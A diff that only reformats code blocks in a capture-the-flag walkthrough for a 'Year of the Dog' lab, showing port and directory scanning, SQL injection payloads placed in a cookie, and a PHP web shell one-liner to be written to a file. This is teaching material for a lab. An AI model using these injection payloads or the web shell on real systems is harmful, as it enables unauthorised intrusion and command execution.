@@ -829,18 +829,26 @@ Locate root flag
 
 ## Year of the Dog
 
-```nmap -sV -sC [Target_IP]```
+```
+nmap -sV -sC [Target_IP]
+```
 
-```gobuster dir -u http://<IP> -w <wordlist>```
+```
+gobuster dir -u http://<IP> -w <wordlist>
+```
 
-```feroxbuster -u http://10.49.134.39 -w dirbuster/wordlists/directory-list-2.3-medium.txt```
+```
+feroxbuster -u http://10.49.134.39 -w dirbuster/wordlists/directory-list-2.3-medium.txt
+```
 
 
 ![enum result](35.png)
 
 Now in the cookie value add this
 
-```or 1=1-- -- ```
+```
+or 1=1-- --
+```
 
 ![[36.png]]
 
@@ -848,11 +856,15 @@ Now in my case the value 40 seems to be not changing as when we used to send req
 
 Now we will apply SQL injection in this cookie id
 
-```' UNION SELECT NULL-- --```
+```
+' UNION SELECT NULL-- --
+```
 
 Now add another NULL after this
 
-```' UNION SELECT NULL,NULL-- --```
+```
+' UNION SELECT NULL,NULL-- --
+```
 
 This tells us that we have two tables, now let us find the table name
 
@@ -920,7 +932,9 @@ Its hex value is just a php code in hex format so we will create a file which ha
 
 ![enum result](42.png)
 
-```<?php system($_GET['x']);?>```
+```
+<?php system($_GET['x']);?>
+```
 
 Now if we convert this into hex and then if we are able to get this x into a file x.php then we can have a netcat reverse shell command too
 
